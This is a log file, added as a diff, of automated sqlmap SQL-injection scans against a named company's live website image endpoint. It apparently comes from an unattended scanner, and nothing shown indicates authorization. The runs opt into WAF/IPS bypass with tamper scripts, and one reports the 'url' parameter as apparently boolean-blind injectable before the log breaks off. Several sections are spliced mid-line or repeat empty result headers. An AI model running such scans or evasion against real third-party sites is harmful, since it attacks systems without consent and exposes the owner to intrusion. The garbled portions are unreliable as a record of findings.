@@ -1,0 +1,80 @@
+===== SQLMAP image_url_w_q =====
+CMD: -u https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+GET https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75
+do you want to test this URL? [Y/n/q]
+> Y
+got a 307 redirect to 'https://www.infinitycapital.bh/404'. Do you want to follow? [Y/n] Y
+----- result rows -----
+Target URL,Place,Parameter,Technique(s),Note(s)
+Target URL,Place,Parameter,Technique(s),Note(s)
+Target URL,Place,Parameter,Technique(s),Note(s)
+Target URL,Place,Parameter,Technique(s),Note(s)
+
+===== SQLMAP image_url_only =====
+CMD: -u https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmO        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}
+|_ -| . ["]     | .'| . |
+|__        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.10.8#stable}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+GET https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75
+do you want to test this URL? [Y/n/q]
+> Y
+o try to automatically bypass the WAF/IPS during the run (e.g. by using a non-scanner User-Agent and tamper script(s))? [Y/n] Y
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+----- result rows -----
+Target URL,Place,Parameter,Technique(s),Note(s)
+Target URL,Place,Parameter,Technique(s),Note(s)
+Target URL,Place,Parameter,Technique(s),Note(s)
+Target URL,Place,Parameter,Technique(s),Note(s)
+Target URL,Place,Parameter,Technique(s),Note(s)
+
+===== SQLMAP image_w =====
+CMD: -u https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75 -p w
+===== SQLMAP image_url_w_q @ 01:17:10 =====
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.8#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 01:17:10 /2026-09-30/
+
+[01:17:10] [WARNING] using '/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs/sqlmap_run' as the output directory
+[01:17:10] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.0 Safari/537.36 Edg/92.0.874.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75
+do you want to test this URL? [Y/n/q]
+> Y
+[01:17:10] [INFO] testing URL 'https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75'
+[01:17:10] [INFO] using '/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs/sqlmap_run/results-09302026_0117am.csv' as the CSV results file in multiple targets mode
+[01:17:10] [INFO] testing connection to the target URL
+[01:17:10] [WARNING] target appears to be rate-limiting requests; sqlmap is backing off and throttling accordingly (consider raising '--delay' or lowering '--threads')
+[01:17:11] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with proxy switches ('--proxy', '--proxy-file'...)
+[01:17:12] [WARNING] the web server responded with an HTTP error code (429) which could interfere with the results of the tests
+[01:17:12] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[01:17:12] [INFO] testing if the target URL content is stable
+[01:17:15] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[01:17:15] [INFO] searching for dynamic content
+[01:17:15] [INFO] dynamic content marked for removal (1 region)
+[01:17:18] [INFO] testing if GET parameter 'url' is dynamic
+[01:17:23] [WARNING] GET parameter 'url' does not appear to be dynamic
+[01:17:29] [WARNING] heuristic (basic) test shows that GET parameter 'url' might not be injectable
+[01:17:37] [INFO] testing for SQL injection on GET parameter 'url'
+[01:17:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[01:18:36] [INFO] GET parameter 'url' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[01:18:36] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
